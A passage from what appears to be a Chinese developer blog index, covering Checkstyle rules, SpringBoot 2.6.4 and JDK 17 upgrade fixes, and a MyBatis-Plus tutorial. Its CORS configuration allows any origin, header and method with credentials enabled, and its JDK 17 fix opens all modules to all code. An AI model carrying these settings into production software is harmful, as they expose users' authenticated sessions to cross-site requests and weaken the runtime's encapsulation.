value=\"SeparatorWrapDot\"/&gt; &lt;property name=\"tokens\" value=\"DOT\"/&gt; &lt;property name=\"option\" value=\"nl\"/&gt; &lt;/module&gt; &lt;module name=\"SeparatorWrap\"&gt; &lt;property name=\"id\" value=\"SeparatorWrapComma\"/&gt; &lt;property name=\"tokens\" value=\"COMMA\"/&gt; &lt;property name=\"option\" value=\"EOL\"/&gt; &lt;/module&gt; &lt;module name=\"SeparatorWrap\"&gt; &lt;property name=\"id\" value=\"SeparatorWrapEllipsis\"/&gt; &lt;property name=\"tokens\" value=\"ELLIPSIS\"/&gt; &lt;property name=\"option\" value=\"EOL\"/&gt; &lt;/module&gt; &lt;module name=\"SeparatorWrap\"&gt; &lt;property name=\"id\" value=\"SeparatorWrapArrayDeclarator\"/&gt; &lt;property name=\"tokens\" value=\"ARRAY_DECLARATOR\"/&gt; &lt;property name=\"option\" value=\"EOL\"/&gt; &lt;/module&gt; &lt;module name=\"SeparatorWrap\"&gt; &lt;property name=\"id\" value=\"SeparatorWrapMethodRef\"/&gt; &lt;property name=\"tokens\" value=\"METHOD_REF\"/&gt; &lt;property name=\"option\" value=\"nl\"/&gt; &lt;/module&gt; &lt;module name=\"PackageName\"&gt; &lt;property name=\"format\" value=\"^[a-z]+(\\.[a-z][a-z0-9]*)*$\"/&gt; &lt;message key=\"name.invalidPattern\" value=\"Package name ''{0}'' must match pattern ''{1}''.\"/&gt; &lt;/module&gt; &lt;module name=\"TypeName\"&gt; &lt;property name=\"tokens\" value=\"CLASS_DEF, INTERFACE_DEF, ENUM_DEF, ANNOTATION_DEF, RECORD_DEF\"/&gt; &lt;message key=\"name.invalidPattern\" value=\"Type name ''{0}'' must match pattern ''{1}''.\"/&gt; &lt;/module&gt; &lt;module name=\"MemberName\"&gt; &lt;property name=\"format\" value=\"^[a-z][a-z0-9][a-zA-Z0-9]*$\"/&gt; &lt;message key=\"name.invalidPattern\" value=\"Member name ''{0}'' must match pattern ''{1}''.\"/&gt; &lt;/module&gt; &lt;module name=\"ParameterName\"&gt; &lt;property name=\"format\" value=\"^[a-z]([a-z0-9][a-zA-Z0-9]*)?$\"/&gt; &lt;message key=\"name.invalidPattern\" value=\"Parameter name ''{0}'' must match pattern ''{1}''.\"/&gt; &lt;/module&gt; &lt;module name=\"LambdaParameterName\"&gt; &lt;property name=\"format\" value=\"^[a-z]([a-z0-9][a-zA-Z0-9]*)?$\"/&gt; &lt;message key=\"name.invalidPattern\" value=\"Lambda parameter name ''{0}'' must match pattern ''{1}''.\"/&gt; &lt;/module&gt; &lt;module name=\"CatchParameterName\"&gt; &lt;property name=\"format\" value=\"^[a-z]([a-z0-9][a-zA-Z0-9]*)?$\"/&gt; &lt;message key=\"name.invalidPattern\" value=\"Catch parameter name ''{0}'' must match pattern ''{1}''.\"/&gt; &lt;/module&gt; &lt;module name=\"LocalVariableName\"&gt; &lt;property name=\"format\" value=\"^[a-z]([a-z0-9][a-zA-Z0-9]*)?$\"/&gt; &lt;message key=\"name.invalidPattern\" value=\"Local variable name ''{0}'' must match pattern ''{1}''.\"/&gt; &lt;/module&gt; &lt;module name=\"PatternVariableName\"&gt; &lt;property name=\"format\" value=\"^[a-z]([a-z0-9][a-zA-Z0-9]*)?$\"/&gt; &lt;message key=\"name.invalidPattern\" value=\"Pattern variable name ''{0}'' must match pattern ''{1}''.\"/&gt; &lt;/module&gt; &lt;module name=\"ClassTypeParameterName\"&gt; &lt;property name=\"format\" value=\"(^[A-Z][0-9]?)$|([A-Z][a-zA-Z0-9]*[T]$)\"/&gt; &lt;message key=\"name.invalidPattern\" value=\"Class type name ''{0}'' must match pattern ''{1}''.\"/&gt; &lt;/module&gt; &lt;module name=\"RecordTypeParameterName\"&gt; &lt;property name=\"format\" value=\"(^[A-Z][0-9]?)$|([A-Z][a-zA-Z0-9]*[T]$)\"/&gt; &lt;message key=\"name.invalidPattern\" value=\"Record type name ''{0}'' must match pattern ''{1}''.\"/&gt; &lt;/module&gt; &lt;module name=\"MethodTypeParameterName\"&gt; &lt;property name=\"format\" value=\"(^[A-Z][0-9]?)$|([A-Z][a-zA-Z0-9]*[T]$)\"/&gt; &lt;message key=\"name.invalidPattern\" value=\"Method type name ''{0}'' must match pattern ''{1}''.\"/&gt; &lt;/module&gt; &lt;module name=\"NoFinalizer\"/&gt; &lt;module name=\"GenericWhitespace\"&gt; &lt;message key=\"ws.followed\" value=\"GenericWhitespace ''{0}'' is followed by whitespace.\"/&gt; &lt;message key=\"ws.preceded\" value=\"GenericWhitespace ''{0}'' is preceded with whitespace.\"/&gt; &lt;message key=\"ws.illegalFollow\" value=\"GenericWhitespace ''{0}'' should followed by whitespace.\"/&gt; &lt;message key=\"ws.notPreceded\" value=\"GenericWhitespace ''{0}'' is not preceded with whitespace.\"/&gt; &lt;/module&gt; &lt;module name=\"Indentation\"&gt; &lt;property name=\"basicOffset\" value=\"4\"/&gt; &lt;property name=\"braceAdjustment\" value=\"4\"/&gt; &lt;property name=\"caseIndent\" value=\"4\"/&gt; &lt;property name=\"throwsIndent\" value=\"4\"/&gt; &lt;property name=\"lineWrappingIndentation\" value=\"4\"/&gt; &lt;property name=\"arrayInitIndent\" value=\"4\"/&gt; &lt;/module&gt; &lt;module name=\"AbbreviationAsWordInName\"&gt; &lt;property name=\"ignoreFinal\" value=\"false\"/&gt; &lt;property name=\"allowedAbbreviationLength\" value=\"0\"/&gt; &lt;property name=\"tokens\" value=\"CLASS_DEF, INTERFACE_DEF, ENUM_DEF, ANNOTATION_DEF, ANNOTATION_FIELD_DEF, PARAMETER_DEF, VARIABLE_DEF, METHOD_DEF, PATTERN_VARIABLE_DEF, RECORD_DEF, RECORD_COMPONENT_DEF\"/&gt; &lt;/module&gt; &lt;module name=\"OverloadMethodsDeclarationOrder\"/&gt; &lt;module name=\"VariableDeclarationUsageDistance\"/&gt; &lt;module name=\"MethodParamPad\"&gt; &lt;property name=\"tokens\" value=\"CTOR_DEF, LITERAL_NEW, METHOD_CALL, METHOD_DEF, SUPER_CTOR_CALL, ENUM_CONSTANT_DEF, RECORD_DEF\"/&gt; &lt;/module&gt; &lt;module name=\"NoWhitespaceBefore\"&gt; &lt;property name=\"tokens\" value=\"COMMA, SEMI, POST_INC, POST_DEC, DOT, LABELED_STAT, METHOD_REF\"/&gt; &lt;property name=\"allowLineBreaks\" value=\"true\"/&gt; &lt;/module&gt; &lt;module name=\"ParenPad\"&gt; &lt;property name=\"tokens\" value=\"ANNOTATION, ANNOTATION_FIELD_DEF, CTOR_CALL, CTOR_DEF, DOT, ENUM_CONSTANT_DEF, EXPR, LITERAL_CATCH, LITERAL_DO, LITERAL_FOR, LITERAL_IF, LITERAL_NEW, LITERAL_SWITCH, LITERAL_SYNCHRONIZED, LITERAL_WHILE, METHOD_CALL, METHOD_DEF, QUESTION, RESOURCE_SPECIFICATION, SUPER_CTOR_CALL, LAMBDA, RECORD_DEF\"/&gt; &lt;/module&gt; &lt;module name=\"OperatorWrap\"&gt; &lt;property name=\"option\" value=\"NL\"/&gt; &lt;property name=\"tokens\" value=\"BAND, BOR, BSR, BXOR, DIV, EQUAL, GE, GT, LAND, LE, LITERAL_INSTANCEOF, LOR, LT, MINUS, MOD, NOT_EQUAL, PLUS, QUESTION, SL, SR, STAR, METHOD_REF, TYPE_EXTENSION_AND \"/&gt; &lt;/module&gt; &lt;module name=\"AnnotationLocation\"&gt; &lt;property name=\"id\" value=\"AnnotationLocationMostCases\"/&gt; &lt;property name=\"tokens\" value=\"CLASS_DEF, INTERFACE_DEF, ENUM_DEF, METHOD_DEF, CTOR_DEF, RECORD_DEF, COMPACT_CTOR_DEF\"/&gt; &lt;/module&gt; &lt;module name=\"AnnotationLocation\"&gt; &lt;property name=\"id\" value=\"AnnotationLocationVariables\"/&gt; &lt;property name=\"tokens\" value=\"VARIABLE_DEF\"/&gt; &lt;property name=\"allowSamelineMultipleAnnotations\" value=\"true\"/&gt; &lt;/module&gt; &lt;module name=\"NonEmptyAtclauseDescription\"/&gt; &lt;module name=\"InvalidJavadocPosition\"/&gt; &lt;module name=\"JavadocTagContinuationIndentation\"/&gt; &lt;!-- Javadoc的第一句缺少一个结SummaryJavadoc --&gt; &lt;!-- &lt;module name=\"SummaryJavadoc\"&gt;--&gt; &lt;!-- &lt;property name=\"forbiddenSummaryFragments\" value=\"^@return the *|^This method returns |^A [{]@code [a-zA-Z0-9]+[}]( is a )\"/&gt;--&gt; &lt;!-- &lt;/module&gt;--&gt; &lt;module name=\"JavadocParagraph\"/&gt; &lt;module name=\"RequireEmptyLineBeforeBlockTagGroup\"/&gt; &lt;module name=\"AtclauseOrder\"&gt; &lt;property name=\"tagOrder\" value=\"@param, @return, @throws, @deprecated\"/&gt; &lt;property name=\"target\" value=\"CLASS_DEF, INTERFACE_DEF, ENUM_DEF, METHOD_DEF, CTOR_DEF, VARIABLE_DEF\"/&gt; &lt;/module&gt; &lt;module name=\"MethodName\"&gt; &lt;property name=\"format\" value=\"^[a-z][a-z0-9][a-zA-Z0-9_]*$\"/&gt; &lt;message key=\"name.invalidPattern\" value=\"Method name ''{0}'' must match pattern ''{1}''.\"/&gt; &lt;/module&gt; &lt;module name=\"SingleLineJavadoc\"/&gt; &lt;module name=\"EmptyCatchBlock\"&gt; &lt;property name=\"exceptionVariableName\" value=\"expected\"/&gt; &lt;/module&gt; &lt;module name=\"CommentsIndentation\"&gt; &lt;property name=\"tokens\" value=\"SINGLE_LINE_COMMENT, BLOCK_COMMENT_BEGIN\"/&gt; &lt;/module&gt; &lt;module name=\"SuppressionXpathFilter\"&gt; &lt;property name=\"file\" value=\"${org.checkstyle.google.suppressionxpathfilter.config}\" default=\"checkstyle-xpath-suppressions.xml\"/&gt; &lt;property name=\"optional\" value=\"true\"/&gt; &lt;/module&gt; &lt;/module&gt; &lt;/module&gt; SpringBoot 依赖冲突 当前所使用的 SpringBoot 为 2.6.4，所以其它 SpringBoot 的场景启动器都会是 2.6.4 swagger 依赖版本 com.github.xiaoymin:knife4j-spring-boot-starter:3.0.3 访问地址：http://localhost:9090/doc.html 跨域问题 当我从 2.3.12 升级到 2.6.4 后有跨域问题，之前有配置跨域但是不起作用 修改原来的跨域自动配置类和 yml 文件 yml 配置 spring: mvc: pathmatch: matching-strategy: ant_path_matcher 自动配置类示例如下(如果加了以后还有访问 404 的吧下面 knife4j与actuator依赖冲突 的 bean 加在 swagger 的自动配置类中) package com.adalucky.config; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import org.springframework.web.cors.CorsConfiguration; import org.springframework.web.cors.UrlBasedCorsConfigurationSource; import org.springframework.web.filter.CorsFilter; /** * @author ada * @Version JDK17 * @Description 跨域配置方案不然 SpringBoot2.6.x 访问会有一些报错 * @since 2022/3/19 19:34 */ @Configuration public class CrosConfig { private CorsConfiguration corsConfig() { CorsConfiguration corsConfiguration = new CorsConfiguration(); corsConfiguration.addAllowedOriginPattern(\"*\"); corsConfiguration.addAllowedHeader(\"*\"); corsConfiguration.addAllowedMethod(\"*\"); corsConfiguration.setAllowCredentials(true); corsConfiguration.setMaxAge(3600L); return corsConfiguration; } @Bean public CorsFilter corsFilter() { UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource(); source.registerCorsConfiguration(\"/**\", corsConfig()); return new CorsFilter(source); } } knife4j与actuator依赖冲突 参考 knife4j与actuator依赖冲突 这里采用的是 com.github.xiaoymin:knife4j-spring-boot-starter:3.0.3 集成 swagge 只需要引用这一个依赖，当我的项目引入了 org.springframework.boot:spring-boot-starter-actuator:2.6.4 后项目启动报错 org.springframework.context.ApplicationContextException: Failed to start bean 'documentationPluginsBootstrapper'; nested exception is java.lang.NullPointerException 在我们 swagger 的自动配置类中加入如下内容，注意依赖别导错了 点击显/隐代码块(完整示例) package com.adalucky.config; import org.springframework.boot.actuate.autoconfigure.endpoint.web.CorsEndpointProperties; import org.springframework.boot.actuate.autoconfigure.endpoint.web.WebEndpointProperties; import org.springframework.boot.actuate.autoconfigure.web.server.ManagementPortType; import org.springframework.boot.actuate.endpoint.ExposableEndpoint; import org.springframework.boot.actuate.endpoint.web.*; import org.springframework.boot.actuate.endpoint.web.annotation.ControllerEndpointsSupplier; import org.springframework.boot.actuate.endpoint.web.annotation.ServletEndpointsSupplier; import org.springframework.boot.actuate.endpoint.web.servlet.WebMvcEndpointHandlerMapping; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import org.springframework.core.env.Environment; import org.springframework.util.StringUtils; import springfox.documentation.builders.ApiInfoBuilder; import springfox.documentation.oas.annotations.EnableOpenApi; import springfox.documentation.service.ApiInfo; import springfox.documentation.service.Contact; import java.util.ArrayList; import java.util.Collection; import java.util.List; @Configuration //@EnableSwagger2 @EnableOpenApi public class SwaggerConfiguration { /** * 解决springboot升级到2.6.x之后，knife4j报错 * * @param webEndpointsSupplier the web endpoints supplier * @param servletEndpointsSupplier the servlet endpoints supplier * @param controllerEndpointsSupplier the controller endpoints supplier * @param endpointMediaTypes the endpoint media types * @param corsProperties the cors properties * @param webEndpointProperties the web endpoint properties * @param environment the environment * @return the web mvc endpoint handler mapping */ @Bean public WebMvcEndpointHandlerMapping webEndpointServletHandlerMapping( WebEndpointsSupplier webEndpointsSupplier, ServletEndpointsSupplier servletEndpointsSupplier, ControllerEndpointsSupplier controllerEndpointsSupplier, EndpointMediaTypes endpointMediaTypes, CorsEndpointProperties corsProperties, WebEndpointProperties webEndpointProperties, Environment environment) { List&lt;ExposableEndpoint&lt;?&gt;&gt; allEndpoints = new ArrayList&lt;&gt;(); Collection&lt;ExposableWebEndpoint&gt; webEndpoints = webEndpointsSupplier.getEndpoints(); allEndpoints.addAll(webEndpoints); allEndpoints.addAll(servletEndpointsSupplier.getEndpoints()); allEndpoints.addAll(controllerEndpointsSupplier.getEndpoints()); String basePath = webEndpointProperties.getBasePath(); EndpointMapping endpointMapping = new EndpointMapping(basePath); boolean shouldRegisterLinksMapping = shouldRegisterLinksMapping(webEndpointProperties, environment, basePath); return new WebMvcEndpointHandlerMapping(endpointMapping, webEndpoints, endpointMediaTypes, corsProperties.toCorsConfiguration(), new EndpointLinksResolver(allEndpoints, basePath), shouldRegisterLinksMapping, null); } /** * shouldRegisterLinksMapping * * @param webEndpointProperties webEndpointProperties * @param environment environment * @param basePath / * @return boolean */ private boolean shouldRegisterLinksMapping(WebEndpointProperties webEndpointProperties, Environment environment, String basePath) { return webEndpointProperties.getDiscovery().isEnabled() &amp;&amp; (StringUtils.hasText(basePath) || ManagementPortType.get(environment).equals(ManagementPortType.DIFFERENT)); } private ApiInfo apiInfo() { return new ApiInfoBuilder() .title(\"测试平台API文档\") .description(\"自动化测试API文档\") .termsOfServiceUrl(\"www.adalucky.com\") .contact(new Contact(\"Ada\", \"www.adalucky.com\", \"958472019@qq.com\")) .version(\"1.0\") .build(); } } @Bean public static BeanPostProcessor springfoxHandlerProviderBeanPostProcessor() { return new BeanPostProcessor() { @Override public Object postProcessAfterInitialization(Object bean, String beanName) throws BeansException { if (bean instanceof WebMvcRequestHandlerProvider || bean instanceof WebFluxRequestHandlerProvider) { customizeSpringfoxHandlerMappings(getHandlerMappings(bean)); } return bean; } private &lt;T extends RequestMappingInfoHandlerMapping&gt; void customizeSpringfoxHandlerMappings(List&lt;T&gt; mappings) { mappings.removeIf(mapping -&gt; mapping.getPatternParser() != null); } @SuppressWarnings(\"unchecked\") private List&lt;RequestMappingInfoHandlerMapping&gt; getHandlerMappings(Object bean) { try { Field field = ReflectionUtils.findField(bean.getClass(), \"handlerMappings\"); field.setAccessible(true); return (List&lt;RequestMappingInfoHandlerMapping&gt;) field.get(bean); } catch (IllegalArgumentException | IllegalAccessException e) { throw new IllegalStateException(e); } } }; } EasyExcel EasyExcel 依赖版本：implementation(“com.alibaba:easyexcel:2.2.6”) JDK 17 文件导出报错 参考 JDK17 EasyExcel 导出报错 文章中用的是 9.5.2 我换成最新的 12.47.0 也是可以的 问题描述，当我的在 JDK11 上运行时正常，升级到 17.0.2 后导出时报错 Caused by: java.lang.reflect.InaccessibleObjectException: Unable to make protected final java.lang.Class java.lang.ClassLoader.defineClass(java.lang.String,byte[],int,int,java.security.ProtectionDomain) throws java.lang.ClassFormatError accessible: module java.base does not “opens java.lang” to unnamed module @61832929 看过一些网上的分析大多数都是说的 EasyExcel 依赖的 cglib 它又依赖于 asm4.2，与 SpringBoot2.6.x底层依赖的 asm3.x 有冲突，重新引入 cglib2.2 即可，不过我这里没有生效，后面百度说是 jdk17 和 EasyExcel 的一些问题 解决方案：引入 implementation(\"org.burningwave:core:12.47.0\") EasyExcel 工具类中添加 StaticComponentContainer.Modules.exportAllToAll(); 完整示例如下 点击显/隐代码块(完整示例) package com.adalucky; import com.adalucky.config.CustomCellWriteHandler; import com.alibaba.excel.EasyExcel; import com.alibaba.excel.context.AnalysisContext; import com.alibaba.excel.event.AnalysisEventListener; import com.alibaba.excel.write.builder.ExcelWriterBuilder; import org.burningwave.core.assembler.StaticComponentContainer; import org.springframework.web.multipart.MultipartFile; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.net.URLEncoder; import java.util.LinkedList; import java.util.List; /** * @author ada * @Version JDK11 * @since 2022/3/15 22:35 * @Description EasyExcel 工具类 */ public class ExelUtil { /** * @param response 浏览器请求对象，必须在接口中定义一个 HttpServletResponse * @param list 需要写入Excel的数据 * @param clazz 实体类(和 Excel 中的数据对应) * @param fileName 写出的文件名 * @param &lt;T&gt; 泛型封装 List * @return 返回 ExcelWriterBuilder 对象，通过调用 ExelUtil.writeExcel(args...).sheet(\"模板\").doWrite(dataList); * @throws IOException */ public static &lt;T&gt; ExcelWriterBuilder writeExcel(HttpServletResponse response, List&lt;T&gt; list, Class clazz, String fileName) throws IOException { // 这里注意 有同学反应使用swagger 会导致各种问题，请直接用浏览器或者用postman //设置输出流返回的格式为 json 和 utf-8编码 //设置成excel application/vnd.ms-excel 会报错 ，因为我们是自己封装的返回对象，No converter for [class com.adalucky.response.Result] with preset Content-Type 'application/vnd.ms-excel;charset=utf-8' //response.setContentType(\"application/vnd.ms-excel\"); StaticComponentContainer.Modules.exportAllToAll(); //jdk17 报错 response.setContentType(\"application/json;charset=utf-8\"); response.setCharacterEncoding(\"utf-8\"); // 这里URLEncoder.encode可以防止中文乱码 当然和easyexcel没有关系，自定义文件名 String name = URLEncoder.encode(fileName, \"UTF-8\"); response.setHeader(\"Content-disposition\", \"attachment;filename=\" + name + \".xlsx\"); //写入的sheet 名称，应该可以用连缀的写法多个 sheet，然后 doWrite return EasyExcel.write(response.getOutputStream(), clazz) //自适应列宽 .registerWriteHandler(new CustomCellWriteHandler()); } public static &lt;T&gt; List&lt;T&gt; readExcel(MultipartFile file, String sheet, Class&lt;T&gt; clazz) throws IOException { List&lt;T&gt; readList = new LinkedList&lt;&gt;(); EasyExcel.read(file.getInputStream()) // 原本返回的LinkHashMap是所以这里需要用我们自己的实体类去加载就自动转成ExcelData类型 .head(clazz) .sheet(sheet) .registerReadListener(new AnalysisEventListener&lt;T&gt;() { @Override public void invoke(T execelData, AnalysisContext analysisContext) { readList.add(execelData); } @Override public void doAfterAllAnalysed(AnalysisContext analysisContext) { } }).doRead(); return readList; } public static Object index(String sheetName) { if (sheetName != null) { return sheetName; } else { return 0; } } } JDK17新特性 这里使用的是 JDK 17.0.2 LTS,下面将会记录从 JDK8 升级到 JDK17 用到的一些新语法，并不一定都是 17 的语法 StringisBlack isEmpty 已经废弃了 isBlack方法和isEmpty 前者忽略空格，后者只要有长度就判为非空。通常对于形参校验的情况下，应使用isBlack","categories":[{"name":"Auto","slug":"Auto","permalink":"https://www.adalucky.com/categories/Auto/"}],"tags":[{"name":"Gradle","slug":"Gradle","permalink":"https://www.adalucky.com/tags/Gradle/"},{"name":"JDK17","slug":"JDK17","permalink":"https://www.adalucky.com/tags/JDK17/"},{"name":"SpringBoot2.6.4","slug":"SpringBoot2-6-4","permalink":"https://www.adalucky.com/tags/SpringBoot2-6-4/"}],"author":"Ada"},{"title":"MybatisPlus","slug":"Auto/Mybatis-Plus","date":"2022-03-08T09:21:00.000Z","updated":"2022-06-13T14:43:37.102Z","comments":true,"path":"/auto/mybatis-plus/","link":"","permalink":"https://www.adalucky.com/auto/mybatis-plus/","excerpt":"MyBatis-Plus (opens new window)（简称 MP）是一个 MyBatis (opens new window)的增强工具，在 MyBatis 的基础上只做增强不做改变，为简化开发、提高效率而生。 我们的愿景是成为 MyBatis 最好的搭档，就像 魂斗罗 中的 1P、2P，基友搭配，效率翻倍。","text":"MyBatis-Plus (opens new window)（简称 MP）是一个 MyBatis (opens new window)的增强工具，在 MyBatis 的基础上只做增强不做改变，为简化开发、提高效率而生。 我们的愿景是成为 MyBatis 最好的搭档，就像 魂斗罗 中的 1P、2P，基友搭配，效率翻倍。 参考资料Mybatis-Plus 快速集成 环境集成配置注意事项 需要配置数据的基本信息 application.yml pom.xml 中不要用 &lt;packaging&gt;pom&lt;/packaging&gt; 会导致resources目录下的文件无法编译到 classes 下 （会提示找不到数据库之类的 启动入口一定要配置 @MapperScan(\"com.adalucky.MybatisPlus.modules\") // 需要扫描的包 不然会提示找不到 bean 注意测试类的目录层级要和 java 中层级保持一致，且测试类没有配置文件时使用的是 main 的配置，如果有的话就必须定义数据库等信息使用自己单独的数据源和配置 Mybatis-Plus 默认是开启了下划线和驼峰互转的，也就是说 如果我们在实体类中定义了属性叫做 userName 那么它执行的时候查询的列会变为 user_name spring: datasource: driver-class-name: com.mysql.cj.jdbc.Driver url: jdbc:mysql://127.0.0.1:3306/data_auto_endpoint?useUnicode=true&amp;characterEncoding=UTF-8&amp;serverTimezone=GMT%2B8 username: test password: 123456 点击显/隐代码块 &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.3.12.RELEASE&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt; &lt;groupId&gt;com.adalucky&lt;/groupId&gt; &lt;artifactId&gt;Mybatis-Plus&lt;/artifactId&gt; &lt;version&gt;1.0.0&lt;/version&gt; &lt;name&gt;Mybatis-Plus&lt;/name&gt; &lt;!-- 会影响 resources 下编译到 classes 下 &lt;packaging&gt;pom&lt;/packaging&gt;--&gt; &lt;description&gt;这是一个关于Mybatis-Plus的学习项目&lt;/description&gt; &lt;properties&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--mybatis-plus--&gt; &lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus-boot-starter&lt;/artifactId&gt; &lt;version&gt;3.5.1&lt;/version&gt; &lt;/dependency&gt; &lt;!-- java 连接 mysql --&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; &lt;!--swagger http://localhost:8080/dev/doc.html --&gt; &lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;knife4j-spring-boot-starter&lt;/artifactId&gt; &lt;!--在引用时请在maven中央仓库搜索3.X最新版本号--&gt; &lt;version&gt;3.0.3&lt;/version&gt; &lt;/dependency&gt; &lt;!--lombok--&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; &lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt; &lt;repository&gt; &lt;id&gt;spring-snapshots&lt;/id&gt; &lt;name&gt;Spring Snapshots&lt;/name&gt; &lt;url&gt;https://repo.spring.io/snapshot&lt;/url&gt; &lt;releases&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/releases&gt; &lt;/repository&gt; &lt;/repositories&gt; &lt;pluginRepositories&gt; &lt;pluginRepository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/pluginRepository&gt; &lt;pluginRepository&gt; &lt;id&gt;spring-snapshots&lt;/id&gt; &lt;name&gt;Spring Snapshots&lt;/name&gt; &lt;url&gt;https://repo.spring.io/snapshot&lt;/url&gt; &lt;releases&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/releases&gt; &lt;/pluginRepository&gt; &lt;/pluginRepositories&gt; &lt;/project&gt; 自动填充 有些数据需要设置为自动填充，比如创建时间、更新时间（当然也可以在数据层面约束） 自动填充：@TableField(fill = FieldFill.xxx)针对创建时间和更新时间可以使用自动填充（当然也可以在数据里面进行设置相应策略） FieldFill.INSERT: 插入数据时 FieldFill.INSERT_UPDATE: 插入和更新 实现类和实体类时间都是用的 LocalDateTime 点击显/隐代码块(实体类) // 创建时间 @TableField(select = false,fill = FieldFill.INSERT) private LocalDateTime createTime; // 更新时间 //@TableField(select = false,fill = FieldFill.INSERT_UPDATE) @TableField(select = false,fill = FieldFill.UPDATE) private LocalDateTime updateTime; 创建 MyMetaObjectHandler.java 实现 MetaObjectHandler 接口 点击显/隐代码块(MyMetaObjectHandler实现类) package com.adalucky.MybatisPlus.common.handler; import com.baomidou.mybatisplus.core.handlers.MetaObjectHandler; import lombok.extern.slf4j.Slf4j; import org.apache.ibatis.reflection.MetaObject; import org.springframework.stereotype.Component; import java.time.LocalDateTime; /** * @ClassName MyMetaObjectHandler * @Description Mybatis-Plus 自动填充创建时间和更新时间为本地时间 * @Author ada * @Computer Mac mini * @Date 2022/3/7 16:56 * @JDKVersion JDK1.8 */ @Slf4j @Component public class MyMetaObjectHandler implements MetaObjectHandler { /** *实体中的日期也需要为 LocalDate 类型 * createTime、updateTime 需要和实体中的保持一致，实体中的需要和数据库映射正确 */ @Override public void insertFill(MetaObject metaObject) { log.info(\"start insert fill createTime....\"); this.strictInsertFill(metaObject, \"createTime\", () -&gt; LocalDateTime.now(), LocalDateTime.class); // 起始版本 3.3.3(推荐) /* this.strictUpdateFill(metaObject, \"updateTime\", () -&gt; LocalDateTime.now(), LocalDateTime.class); // 起始版本 3.3.3(推荐) 这行注释了因为插入的时候我不想生成更新时间*/ } @Override public void updateFill(MetaObject metaObject) { log.info(\"start update fill updateTime....\"); this.strictUpdateFill(metaObject, \"updateTime\", () -&gt; LocalDateTime.now(), LocalDateTime.class); // 起始版本 3.3.3(推荐) } } @version简介 标记乐观锁，通过 version 字段来保证数据的安全性，当修改数据的时候，会添加 version 作为条件，当条件成立的时候才会修改成功 原理：数据库中新增一个 version 字段，两个线程同时去操作数据是会加上 version 这个字段的值，操作完成后就会修改这个 version 值，可以保证线程安全 多线程并发案例：线程执行前为 1，其中一个执行成功后会修改 version 那么另外一个就查询不到也就不会去修改了 线程一：update…..set version = 2 where version = 1 线程二：update…..set version = 2 where version = 1 示例 数据库表内添加 version 字段 int 类型，设置默认值为 1 实体中新增 version 成员变量，并添加 @version 注解 @Version private Integer version; 新增配置类 MyBatisPlusConfig.java 点击显/隐代码块 package com.adalucky.MybatisPlus.config; import com.baomidou.mybatisplus.annotation.DbType; import com.baomidou.mybatisplus.extension.plugins.MybatisPlusInterceptor; import com.baomidou.mybatisplus.extension.plugins.inner.OptimisticLockerInnerInterceptor; import com.baomidou.mybatisplus.extension.plugins.inner.PaginationInnerInterceptor; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; /** * @ClassName MyBatisPlusConfig * @Description MyBatis-Plus 配置类 * @Author ada * @Computer Mac mini * @Date 2022/1/28 18:25 * @JDKVersion JDK1.8 */ @Configuration public class MyBatisPlusConfig { // 最新版 分页插件 DbType.MYSQL 指定为自己的方言 @Bean public MybatisPlusInterceptor mybatisPlusInterceptor() { MybatisPlusInterceptor interceptor = new MybatisPlusInterceptor(); interceptor.addInnerInterceptor(new PaginationInnerInterceptor(DbType.MYSQL)); return interceptor; } /** * 乐观锁 * @return */ @Bean public MybatisPlusInterceptor 